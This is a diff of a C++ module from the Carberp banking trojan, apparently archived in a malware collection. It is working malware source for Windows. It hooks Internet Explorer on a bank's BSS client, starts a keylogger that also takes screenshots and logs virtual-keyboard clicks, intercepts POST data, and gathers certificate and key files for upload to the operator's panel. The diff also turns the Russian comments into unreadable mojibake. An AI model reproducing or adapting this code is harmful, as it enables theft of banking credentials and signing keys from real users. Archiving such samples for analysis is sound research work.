@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 #include <shlobj.h>
 #include "GetApi.h"
@@ -18,7 +29,7 @@ namespace DBGBSSWEB
 
 #define DBGBSS DBGBSSWEB::DBGOutMessage<>
 
-#define BSSWebModule //говорим что модуль включен
+#define BSSWebModule //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 namespace BSSWeb
 {
@@ -28,18 +39,18 @@ namespace BSSWeb
 
 
 
-    string *WorkHost;  // Имя домена для определения передачи файлов
+    string *WorkHost;  // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 
 	bool SystemAdded = false;
 	PKeyLogSystem System = 0;
-	PList hashKeys = 0; //список ключей которые уже сохранили
+	PList hashKeys = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	CRITICAL_SECTION csHashKeys;
 
-	//отсылает найденные файлы ключи в админку
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int FileIsKey( FileGrabber::ParamEvent* e )
 	{
-		//смотрим добавляли ли уже найденный ключ
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		DWORD hashFile =  STR::GetHash( e->fileName, 0, false );
 		bool exists = true;
 		pEnterCriticalSection(&csHashKeys);
@@ -52,16 +63,16 @@ namespace BSSWeb
 		if( !exists )
 		{
 			DBGBSS( "BSS", "KeyFile: '%s'", e->fileName );
-			//ищем символ : разделитель диска
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ : пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			const char* p = e->fileName;
 			while( *p && *p != ':' ) p++;
-			if( *p == 0 ) //диска нет, значит скорее всего сетевая папка
+			if( *p == 0 ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 				p = e->fileName;
 			else
-				p++; //обходим :
-			//игнорируем начальные слеши 
+				p++; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ :
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 
 			while( *p == '\\' || *p == '/' ) p++;
-			//формируем имя файла для архива
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			m_lstrcpy( e->nameSend, "keys\\" );
 			m_lstrcat( e->nameSend, p );
 			return FileGrabber::SENDFILE;
@@ -85,13 +96,13 @@ namespace BSSWeb
 		rv->maska = "-BEGIN CERTIFICATE-*-END CERTIFICATE-";
 		const char gifFormat[] = { 'G', 'I', 'F', 0 };
 		const char pngFormat[] = { (char)0x89, 'P', 'N', 'G', 0 };
-		FileGrabber::AddIgnoreBeg( rv, gifFormat ); //игнорируем формат gif
-		FileGrabber::AddIgnoreBeg( rv, pngFormat ); //игнорируем формат png
+		FileGrabber::AddIgnoreBeg( rv, gifFormat ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ gif
+		FileGrabber::AddIgnoreBeg( rv, pngFormat ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ png
 
 		const DWORD ignoreExt[] =
 			{ 0x1D36F0 /* tmp */, 0x1AB867 /* jpg */, 0x1CF4E7 /* sig */, 0x1D3C74 /* txt */,
 			  0x1A71EF /* ico */, 0x1C3767 /* png */, 0 };
-		const DWORD neededExt[] = //хеши скопированы с модуля bss.cpp, поэтому неизвестно какие это расширения )
+		const DWORD neededExt[] = //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ bss.cpp, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ )
 			{ 0x18F2F2, 0x1AF2F9, 0x1CF2E3, 0x1C3AE2, 0x18F96C, 0x1BF871, 0x193133, 0x1C32ED, 0x1CB2F1, 0
 			};
 		FileGrabber::AddIgnoreExt( rv, ignoreExt );
@@ -124,28 +135,28 @@ namespace BSSWeb
 
 		PDWORD Flags = (PDWORD)FlagsPtr;
 
-		// Получаем хэш текста
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD Hash = CalcHash(Text);
 		STR::Free(Text);
 
-		if (Hash == 0xBDD8F46E /* Логин */)
+		if (Hash == 0xBDD8F46E /* пїЅпїЅпїЅпїЅпїЅ */)
 			*Flags |= 1;
 		else
-		if (Hash == 0xF1E44B82 /* Пароль */)
+		if (Hash == 0xF1E44B82 /* пїЅпїЅпїЅпїЅпїЅпїЅ */)
 			*Flags |= 2;
 
 
 
-		// Будем продолжать поиск до тех пор пока не найдём
-		// нужные окна
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
         return *Flags != 3;
 	}
 	//------------------------------------------------------------------------
 
 	void WndIsVirtualKeyboard(LPVOID Sender, HWND Wnd, LPVOID Data, bool &Filtrated)
 	{
-		// Функция проверяет является ли окно окном
-		// виртуальной клавиатуры
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD Flags = 0;
 
 		pEnumChildWindows(Wnd, __CheckVKeyboardWnd, (LPARAM)&Flags);
@@ -154,10 +165,10 @@ namespace BSSWeb
 	}
 	//------------------------------------------------------------------------
 
-	//запуск кейлогера
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	void InitKeyLogger()
 	{
-		DBGBSS( "BSS", "Инициализируем систему" );
+		DBGBSS( "BSS", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 
 		PKeyLogSystem S = KeyLogger::AddSystem(BSS_SystemName, PROCESS_HASH_IE);
 		if( S != NULL )
@@ -165,11 +176,11 @@ namespace BSSWeb
 			SystemAdded = true;
 
 			S->SendLogAsCAB = true;
-			// Устанавливаем режим работы в одном фильтре и не меньше указанного
-			// времени
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 			S->TimeMode    = KLG_TIME_MIN;
-			S->TimeValue   = 5 * 60; // Система будет работать немение 5-ти минут
+			S->TimeValue   = 5 * 60; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 5-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			S->MakeScreenShot = true;
 			hashKeys = 0;
 
@@ -180,7 +191,7 @@ namespace BSSWeb
 			F->LogClicks = true;
 			F->MakeScreenShot = true;
 
-			// Добавляем фильтр цифровой клавиатуры
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			F = KeyLogger::AddFilter(S, true, false, "obj_STATIC", NULL, FILTRATE_PARENT_WND, LOG_MOUSE, 7);
 			if (F != NULL)
 				F->OnFiltrate = WndIsVirtualKeyboard;
@@ -193,7 +204,7 @@ namespace BSSWeb
 
 	void ProcessPostData(PHTTPRequestData Data)
 	{
-		// Обрабатываем пост запрос
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Data->PostData == NULL)
 			return;
 
@@ -208,7 +219,7 @@ namespace BSSWeb
 
 			KeyLogger::AddStrToBuffer((HWND)-1, Buf, 0);
 
-            DBGBSS( "BSS", "Добавляем данные запроса %s", Buf);
+            DBGBSS( "BSS", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", Buf);
 
 			STR::Free(Buf);
 		}
@@ -231,14 +242,14 @@ namespace BSSWeb
 
 		bool IsBSS = m_strstr(URL, BSS_DllName) > 0;
 
-		//  Добавляем систему
+		//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (!SystemAdded && IsBSS)
 		{
         	DBGBSS( "BSS", "URL %s", URL );
 			InitKeyLogger();
 		}
 
-		// От ключаем систему, если юзер находится на другой вкладке
+		// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (SystemAdded)
 		{
 			PKeyLogSystem S = KeyLogger::SystemByName(BSS_SystemName);
@@ -251,7 +262,7 @@ namespace BSSWeb
 
 				case KLE_INTERNET_WRITE_FILE:
 					{
-						// Перехватываем пост данные
+						// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 						KeyLogger::ActivateSystem(S);
 						ProcessPostData((PHTTPRequestData)Data);
 					}
@@ -266,7 +277,7 @@ namespace BSSWeb
 
 	void Init()
 	{
-		//Устанавливаем событие на смену урла в ИЕ
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ
 		SystemAdded = false;
 		WorkHost = NULL;
 		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
@@ -277,7 +288,7 @@ namespace BSSWeb
 
 
 //----------------------------------------------------------------------------
-//  Временный код, который складывает все файлы удовлетворяющие маске бсс
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 //----------------------------------------------------------------------------
 
 bool IsBSSDocument(PCHAR URL)
@@ -292,13 +303,13 @@ bool IsBSSDocument(PCHAR URL)
 
 void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
 {
-	// Проверяем маску
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	bool IsBSS = STR::Pos(aURL, (PCHAR)BSSWeb::BSS_DllName) >= 0;
 
 	if (!IsBSS && !IsBSSDocument(aURL))
 	{
-    	// не интересующий нас документ
+    	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         return;
     }
 
@@ -310,14 +321,14 @@ void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
 
 	if (IsBSS)
 	{
-		// Запоминаем домен, для которого записывать данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (BSSWeb::WorkHost != NULL)
 			delete BSSWeb::WorkHost;
 		BSSWeb::WorkHost = new string(URL.Host);
     }
 
 
-	// Определяем каталог хранения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	string Path(MAX_PATH);
 
 	pSHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE);
@@ -327,10 +338,10 @@ void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
 	Path += "\\BSS.V1\\";
 	pCreateDirectoryA(Path.t_str(), NULL);
 
-	// Определяем имя файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	string FileName = Path + URL.Document;
 
-	// Записываем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	File::WriteBufferA(FileName.t_str(), Data, DataSize);
 
 
